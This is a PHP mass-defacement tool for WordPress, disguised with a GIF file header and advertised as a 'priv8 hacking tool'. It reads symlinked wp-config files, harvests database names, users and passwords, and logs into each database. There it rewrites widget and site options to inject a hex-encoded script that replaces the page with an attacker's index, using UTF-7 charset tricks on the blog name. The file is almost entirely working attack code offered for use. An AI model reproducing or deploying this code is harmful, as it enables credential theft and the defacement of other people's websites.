GIF89;a
<title>Wordpress MassDeface(Coded By RAB3OUN)</title>
/*
Symlink to Wordpress mass defacer
Like Us for hot priv8 hacking tools!!
http://facebook.com/0dayBlog
Enjoy!!
*/
<style>
body
{
        background: #0f0e0d;
        color: #FF9933;
        padding: 0px;
}
a:link, body_alink
{
        color: #FF9933;
        text-decoration: none;
}
a:visited, body_avisited
{
        color: #FF9933;
        text-decoration: none;
}
a:hover, a:active, body_ahover
{
        color: #FFFFFF;
        text-decoration: none;
}
td, th, p, li,table
{
       
        background: #2e2b28;
        border:1px solid #524f46;
}
input
{
        border: 1px solid;
        cursor: default;
       
        overflow: hidden;
        background: #2e2b28;
        color: #ffffff;
}textarea
{
        border: 1px solid;
        cursor: default;
       
        overflow: hidden;
        background: #2e2b28;
        color: #ffffff;
}
button
{
        border: 1px solid;
        cursor: default;
       
        overflow: hidden;
        background: #2e2b28;
        color: #ffffff;
}
</style>
</head>
 
<body bgcolor="black">
<center>
<pre>
__          __      __  __                 _____        __              
\ \        / /     |  \/  |               |  __ \      / _|              
 \ \  /\  / / __   | \  / | __ _ ___ ___  | |  | | ___| |_ __ _  ___ ___
  \ \/  \/ / '_ \  | |\/| |/ _` / __/ __| | |  | |/ _ \  _/ _` |/ __/ _ \
   \  /\  /| |_) | | |  | | (_| \__ \__ \ | |__| |  __/ || (_| | (_|  __/
    \/  \/ | .__/  |_|  |_|\__,_|___/___/ |_____/ \___|_| \__,_|\___\___|
           | |                                                          
           |_|                                                          
</pre>
</center>
<form method="POST" action="" >
<center>
<table border='1'><tr><td>List of All Symlink</td><td>
<input type="text" name="url" size="100" value="list.txt"></td></tr>
<tr><td>Index</td><td>
<textarea name="index" cols='50' rows='10' ></textarea></td></tr></table>
<br><br><input type="Submit" name="Submit" value="Submit">
<input type="hidden" name="action" value="1"></form>
</center>
<?
set_time_limit(0);
if ($_POST['action']=='1'){
$url=$_POST['url'];
$users=@file($url);
 
 
if (count($users)<1) exit("<h1>No config found</h1>");
foreach ($users as $user) {
$user1=trim($user);
$code=file_get_contents2($user1);
preg_match_all('|define.*\(.*\'DB_NAME\'.*,.*\'(.*)\'.*\).*;|isU',$code,$b1);
$db=$b1[1][0];
preg_match_all('|define.*\(.*\'DB_USER\'.*,.*\'(.*)\'.*\).*;|isU',$code,$b2);
$user=$b2[1][0];
preg_match_all('|define.*\(.*\'DB_PASSWORD\'.*,.*\'(.*)\'.*\).*;|isU',$code,$b3);
$db_password=$b3[1][0];
preg_match_all('|define.*\(.*\'DB_HOST\'.*,.*\'(.*)\'.*\).*;|isU',$code,$b4);
$host=$b4[1][0];
preg_match_all('|\$table_prefix.*=.*\'(.*)\'.*;|isU',$code,$b5);
$p=$b5[1][0];
 
 
$d=@mysql_connect( $host, $user, $db_password ) ;
if ($d){
@mysql_select_db($db );
$source=stripslashes($_POST['index']);
$s2=strToHex(($source));
$s="<script>document.documentElement.innerHTML = unescape(''$s2'');</script>";
$ls=strlen($s)-2;
$sql="update ".$p."options set option_value='a:2:{i:2;a:3:{s:5:\"title\";s:0:\"\";s:4:\"text\";s:$ls:\"$s\";s:6:\"filter\";b:0;}s:12:\"_multiwidget\";i:1;}' where option_name='widget_text'; ";
mysql_query($sql) ;
$sql="update ".$p."options set option_value='a:7:{s:19:\"wp_inactive_widgets\";a:6:{i:0;s:10:\"archives-2\";i:1;s:6:\"meta-2\";i:2;s:8:\"search-2\";i:3;s:12:\"categories-2\";i:4;s:14:\"recent-posts-2\";i:5;s:17:\"recent-comments-2\";}s:9:\"sidebar-1\";a:1:{i:0;s:6:\"text-2\";}s:9:\"sidebar-2\";a:0:{}s:9:\"sidebar-3\";a:0:{}s:9:\"sidebar-4\";a:0:{}s:9:\"sidebar-5\";a:0:{}s:13:\"array_version\";i:3;}' where option_name='sidebars_widgets';";
mysql_query($sql) ;
if (function_exists("mb_convert_encoding") )
{
$source2 = mb_convert_encoding('</title>'.$source.'<DIV style="DISPLAY: none"><xmp>', 'UTF-7');
$source2=mysql_real_escape_string($source2);
$sql = "UPDATE `".$p."options` SET `option_value` = '$source2' WHERE `option_name` = 'blogname';";
@mysql_query($sql) ; ;
$sql= "UPDATE `".$p."options` SET `option_value` = 'UTF-7' WHERE `option_name` = 'blog_charset';";
@mysql_query($sql) ; ;
}
$aa=@mysql_query("select option_value from `".$p."options` WHERE `option_name` = 'siteurl';") ;;
$siteurl=@mysql_fetch_array($aa) ;
$siteurl=$siteurl['option_value'];
$tr.="$siteurl\n";
mysql_close();
}
}
if ($tr) echo "Index changed for <br><br><textarea cols='50' rows='10' >$tr</textarea>";
}
function strToHex($string)
{
    $hex='';
    for ($i=0; $i < strlen($string); $i++)
    {
        if (strlen(dechex(ord($string[$i])))==1){
        $hex .="%0". dechex(ord($string[$i]));
                }
                else
                {
                $hex .="%". dechex(ord($string[$i]));
                }
    }
    return $hex;
}
 
function file_get_contents2($u){
 
        $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$u);
        curl_setopt($ch, CURLOPT_HEADER, 0);    
   curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0 ");
            $result = curl_exec($ch);
        return $result ;
        }
       
?>